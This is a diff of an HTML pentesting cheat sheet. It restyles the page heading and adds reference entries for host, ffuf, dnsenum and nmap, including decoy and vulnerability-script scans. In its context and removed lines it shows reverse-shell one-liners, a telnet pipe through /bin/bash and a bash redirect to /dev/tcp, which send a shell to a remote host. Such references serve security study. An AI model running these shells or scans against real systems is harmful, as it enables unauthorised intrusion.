@@ -9,14 +9,15 @@
   <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" rel="stylesheet"> 
 </head>
 <body>
-  <div class="heading">
+  <!-- <div class="heading">
     <h1>Pentesting <br> tools/utilities</h1>
-  </div>
+  </div> -->
 
   <main>
-    <h2>┌───┴───┐</h2>
-    <h2>│ Linux   │</h2>
-    <h2>└───────┘</h2>
+    <h2>┌──────┴──────┐</h2>
+    <h2>│<span class="spacer">aa</span>Pentesting<span class="spacer">a</span>│</h2>
+    <h2>│<span class="spacer">aaaa</span>tools<span class="spacer">aaaa</span>│</h2>
+    <h2>└─────────────┘</h2>
 
     <ul class="container">
       <p>┌───────┐</p>
@@ -372,6 +373,18 @@
       <li>
         ├ <span class="cmd">host</span> <span class="param">dns</span>
         <span class="exp">: shows ip of <span class="param">dns</span> </span>
+				<br>│ <span class="ident">
+          <span class="opt">-t </span> <span class="param">type</span>
+          <span class="exp">: type of register, SOA, A, AAAA, NS, MX or PTR</span>
+        </span>
+				<br>│ <span class="ident">
+          <span class="opt">-l </span>
+          <span class="exp">: lists hosts in a domain, uses AXFR </span>
+          <br>│ <span class="exp"> <span class="spacer">aaaaaaaaa</span>(when the original dns stops working, another is used)</span>
+        </span>
+				<br> │ <span class="ident">
+					<span class="opt">-v</span> <span class="exp">: verbose</span>
+				</span>
       </li>
 
       <p>├────────────────────────────────────────────────────────────────</p>
@@ -435,16 +448,6 @@
         <br>│<code>telnet <span class="param">ip1</span> <span class="param">port1</span> | /bin/bash | telnet <span class="param">ip2</span> <span class="param">port2</span></code>
         <br>│<code class="etc">connects and sends shell to <span class="param">ip1</span> <span class="param">port1</span>, and outputs to <span class="param">ip2</span> <span class="param">port2</span></code>
         <br>│<code class="etc">OBS: can be the same ip</code>
-      </li>
-
-      <p>├────────────────────────────────────────────────────────────────</p>
-
-      <li>
-        ├ <span class="cmd">/dev/tcp</span>
-        <span class="exp">: easily open tcp ports </span>
-        <br>│<code>echo 'this will be send to the port' > /dev/tcp/192.168.0.200/4545</code>
-        <br>│<code>bash -i > /dev/tcp/192.168.0.200/4545 0>&1 2>&1 </code>
-        <br>│<code class="etc">sends bash to 192.168.0.200:4545 and shows input(0) e error(2) in the output(1)</code>
       </li>
 
       <p>├────────────────────────────────────────────────────────────────</p>
@@ -530,6 +533,97 @@
         <span class="exp">: websites, info like asn/netblock, if there's a dns </span>
       </li>
 
+			<p>├────────────────────────────────────────────────────────────────</p>
+
+			<li>
+				├ <span class="cmd">ffuf</span> <span class="exp">: dns fuzzer</span>
+				<br> │ <span class="ident">
+					<span class="opt">-u <span class="param">url</span></span>
+					<span class="exp">: specifies url</span>
+					<br> │ <code class="etc">&lturl&gt:FUZZ to sppecify where to brute force</code>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">-w <span class="param">wordlist</span></span>
+					<span class="exp">: specifies worlist to use</span>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">-e <span class="param">ext</span></span>
+					<span class="exp">: specifies extension (.php, .html)</span>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">-recursion</span>
+					<span class="exp">: enables recursion</span>
+				</span>
+			</li>
+
+			<p>├────────────────────────────────────────────────────────────────</p>
+
+			<li>
+				├ <span class="cmd">dnsenum</span> <span class="exp">: multi purpose dns tool</span>
+				<br> │ <span class="ident">
+					<span class="opt">--enum <span class="param">dns</span></span>
+					<span class="exp">: dns to scan</span>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">-f <span class="param">wordlist</span></span>
+					<span class="exp">: wordlist to sub domain brute force</span>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">-w</span>
+					<span class="exp">: performs whois</span>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">-r</span>
+					<span class="exp">: enables recursion</span>
+				</span>
+			</li>
+
+			<p>├────────────────────────────────────────────────────────────────</p>
+
+			<li>
+				├ <span class="cmd">nmap <span class="param">ip/range</span></span> <span class="exp">: scans entire netword in <span class="param">range</span></span>
+				<br> │ <code>nmap 192.168.0.0/24</code>
+				<br> │ <span class="ident">
+					<span class="opt">-v</span>
+					<span class="exp">: verbose</span>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">-O</span>
+					<span class="exp">: identifies OS</span>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">-sV</span>
+					<span class="exp">: service version</span>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">-sF</span>
+					<span class="exp">: sends FYN flag</span>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">-sT</span>
+					<span class="exp">: sends full TCP protocol</span>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">-sS</span>
+					<span class="exp">: stealthy scan, (SYN scan)</span>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">-p <span class="param">port</span></span>
+					<span class="exp">: specifies port</span>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">-D <span class="param">ip</span></span>
+					<span class="exp">: sets <span class="param">ip</span> as decoy, decoy will </span>
+					<br>│ <span class="exp"> <span class="spacer">aaaaaaaaa</span>send the same traffic as you, hardening identification</span>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">--script <span class="param">script</span></span>
+					<span class="exp">: specifies script to use</span>
+					<br> │ <code>nmap --script vuln 192.168.0.110</code>
+				</span>
+			</li>
+
+			<p>├────────────────────────────────────────────────────────────────</p>
 
     </ul>
 
